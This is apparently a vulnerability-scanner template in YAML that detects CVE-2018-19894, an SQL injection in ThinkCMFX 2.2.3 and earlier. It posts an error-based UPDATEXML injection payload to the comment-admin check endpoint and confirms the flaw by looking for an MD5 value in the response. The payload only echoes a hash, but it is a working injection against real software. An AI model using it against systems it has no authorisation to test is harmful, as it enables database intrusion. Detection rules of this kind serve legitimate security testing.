name: poc-yaml-thinkcmf-cve-2018-19894-sqli
binding: 64f64951-4c25-483f-a8c2-595f870052e6
manual: true
detail:
    author: min(minrui.zhang@chaitin.com)
    links:
        - https://cve.mitre.org/cgi-bin/cvename.cgi?name=2018-19894
        - https://github.com/thinkcmf/cmfx/issues/26
    vulnerability:
        id: CT-66910
        level: high
    ThinkCMF: ThinkCMFX <=2.2.3
    info: 后台管理员权限
transport: http
set:
    rand1: randomInt(800000000, 1000000000)
rules:
    r0:
        request:
            cache: true
            method: POST
            path: /?g=Comment&m=commentadmin&a=check&check=1
            headers:
                Content-Type: application/x-www-form-urlencoded
            body: ids[]=1&ids[]=2 and UPDATEXML(1,CONCAT(0x7e,(SELECT md5({{rand1}})),0x7e),1)
            follow_redirects: false
        expression: response.body.bcontains(bytes(substr(md5(string(rand1)), 0, 31)))
expression: r0()
